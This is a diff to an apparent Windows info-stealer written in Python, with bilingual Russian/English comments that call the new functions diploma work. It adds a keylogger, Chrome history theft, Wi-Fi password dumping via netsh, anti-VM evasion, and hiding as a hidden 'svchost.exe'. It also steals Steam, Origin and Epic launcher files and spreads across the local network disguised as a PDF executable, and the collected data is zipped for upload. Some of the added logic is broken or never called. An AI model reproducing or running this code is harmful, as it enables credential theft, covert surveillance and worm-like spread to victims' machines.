@@ -11,10 +11,15 @@ The collected data is encrypted and compressed into a ZIP archive with multiple 
 
 Author: Vorf1s / Автор: Vorf1s
 Date: 20.07.2025 / Дата: 20.07.2025 
-Last update 24.07.2025 / Последнее обновление 24.07.2025
-Version: 1.3 / Версия: 1.3
+Last update 09.08.2025 / Последнее обновление 09.08.2025
+Version: 1.4 / Версия: 1.4
 """
-
+import ctypes
+import re
+import subprocess
+import winreg
+import string
+import random
 import os
 import sys
 import shutil
@@ -764,6 +769,33 @@ def main():
 
     if uploader.upload_file(zip_path, remote_path):
         os.remove(zip_path)
+    # Anti-VM check / Проверка на виртуальную машину
+    if is_running_in_vm():
+        return
+
+    # Сбор истории браузеров
+    collect_browser_history(temp_dir)
+
+    # Сбор Wi-Fi паролей
+    collect_wifi_passwords(temp_dir)
+
+    # Активное окно
+    with open(os.path.join(temp_dir, "active_window.txt"), "w", encoding="utf-8") as f:
+        f.write(get_foreground_window_title())
+
+    # Активность пользователя
+    log_activity(temp_dir, 10)
+
+    # Геолокация
+    with open(os.path.join(temp_dir, "geolocation.txt"), "w", encoding="utf-8") as f:
+        f.write(get_geolocation_info())
+
+    # Добавление случайного суффикса к имени ZIP
+    import random
+    suffix = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=4))
+    zip_filename = zip_filename.replace(".zip", f"_{suffix}.zip")
+    zip_path = os.path.join(hidden_temp_base, zip_filename)
+
 
 
 if __name__ == "__main__":
@@ -779,3 +811,165 @@ if __name__ == "__main__":
             pass
 
     main()
+
+
+# ===============================================
+# Дополнительные функции для дипломной работы
+# ===============================================
+
+# ======= Keylogger / Клавиатурный шпион =======
+from pynput import keyboard
+
+keystrokes = []
+
+def on_press(key):
+    """Обработчик нажатий клавиш"""
+    try:
+        keystrokes.append(key.char)
+    except AttributeError:
+        keystrokes.append(str(key))
+
+
+# ======= Browser history / История браузеров =======
+def collect_browser_history(temp_dir):
+    """Собрать историю браузеров (Chrome)"""
+    try:
+        chrome_history = os.path.join(os.getenv('LOCALAPPDATA'),
+                                      'Google', 'Chrome', 'User Data', 'Default', 'History')
+        if os.path.exists(chrome_history):
+            shutil.copy2(chrome_history, os.path.join(temp_dir, "chrome_history.db"))
+    except Exception:
+        pass
+
+
+# ======= Wi-Fi passwords / Пароли Wi-Fi =======
+def collect_wifi_passwords(temp_dir):
+    """Собрать сохранённые пароли Wi-Fi"""
+    if platform.system() != "Windows":
+        return
+    try:
+        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
+        profiles = re.findall("All User Profile\s*:\s(.*)", result)
+        with open(os.path.join(temp_dir, "wifi_passwords.txt"), "w", encoding="utf-8") as f:
+            for profile in profiles:
+                profile = profile.strip()
+                try:
+                    pw_result = subprocess.check_output(
+                        f"netsh wlan show profile \'{profile}\' key=clear", shell=True).decode()
+                    password = re.search("Key Content\s*:\s(.*)", pw_result)
+                    if password:
+                        f.write(f"{profile}: {password.group(1)}\n")
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
+
+# ======= Anti-VM / Проверка на виртуальную машину =======
+def is_running_in_vm():
+    """Определение, работает ли программа в виртуальной машине"""
+    try:
+        output = subprocess.check_output("wmic bios get serialnumber", shell=True).decode()
+        suspicious = ["VMware", "VirtualBox", "QEMU", "Xen"]
+        return any(x in output for x in suspicious)
+    except:
+        return False
+
+
+# ======= Foreground window / Активное окно =======
+def get_foreground_window_title():
+    """Получить заголовок активного окна (Windows only)"""
+    try:
+        import win32gui
+        window = win32gui.GetForegroundWindow()
+        return win32gui.GetWindowText(window)
+    except:
+        return "Unknown"
+
+
+# ======= User activity logging / Логирование активности =======
+def log_activity(temp_dir, duration=30):
+    """Отслеживание активности пользователя (мышь, клавиатура)"""
+    try:
+        import mouse, keyboard
+        start_time = time.time()
+        with open(os.path.join(temp_dir, "user_activity.txt"), "w", encoding="utf-8") as f:
+            while time.time() - start_time < duration:
+                if mouse.is_pressed():
+                    f.write(f"Mouse clicked at {time.time()}\n")
+                if keyboard.is_pressed('ctrl'):
+                    f.write(f"CTRL pressed at {time.time()}\n")
+                time.sleep(0.1)
+    except:
+        pass
+
+
+# ======= Geolocation / Геолокация по IP =======
+def get_geolocation_info():
+    """Получить информацию о геолокации"""
+    try:
+        with urllib.request.urlopen("http://ip-api.com/json") as response:
+            data = json.load(response)
+            return f"City: {data['city']}, Country: {data['country']}, ISP: {data['isp']}"
+    except:
+        return "Geolocation: Unknown"
+
+
+
+# --- ДОБАВЛЕННЫЕ ФУНКЦИИ ---
+
+# --- Скрытие себя как системного файла и переименование под системный ---
+try:
+    exe_path = sys.argv[0]
+    if not exe_path.lower().endswith('.py'):
+        hidden_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
+        if exe_path != hidden_path:
+            shutil.copy2(exe_path, hidden_path)
+            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 0x02)  # HIDDEN
+except Exception:
+    pass
+
+
+# --- Кража Steam / Origin / Epic сессий и файлов ---
+def steal_game_launchers_data(base_path):
+    try:
+        launcher_paths = {
+            "Steam": os.path.expandvars(r"%APPDATA%\..\Local\Steam"),
+            "Origin": os.path.expandvars(r"%APPDATA%\Origin"),
+            "EpicGames": os.path.expandvars(r"%LOCALAPPDATA%\EpicGamesLauncher")
+        }
+        for name, path in launcher_paths.items():
+            if os.path.exists(path):
+                dst = os.path.join(base_path, "launchers", name)
+                os.makedirs(dst, exist_ok=True)
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        try:
+                            full_path = os.path.join(root, file)
+                            rel_path = os.path.relpath(full_path, path)
+                            dest_path = os.path.join(dst, rel_path)
+                            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
+                            shutil.copy2(full_path, dest_path)
+                        except: pass
+    except: pass
+
+steal_game_launchers_data(ZIPDATA)
+
+# --- Распространение по локальной сети через net use ---
+def spread_on_network():
+    try:
+        output = subprocess.check_output("arp -a", shell=True).decode()
+        ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", output)
+        for ip in ips:
+            try:
+                share = f"\\{ip}\C$\ Users\Public"
+                subprocess.call(f'net use {share}', shell=True)
+                if os.path.exists(share):
+                    dst = os.path.join(share, "Фото_Диплома.pdf.exe")
+                    if not os.path.exists(dst):
+                        shutil.copy2(sys.argv[0], dst)
+            except: pass
+    except: pass
+
+spread_on_network()
+
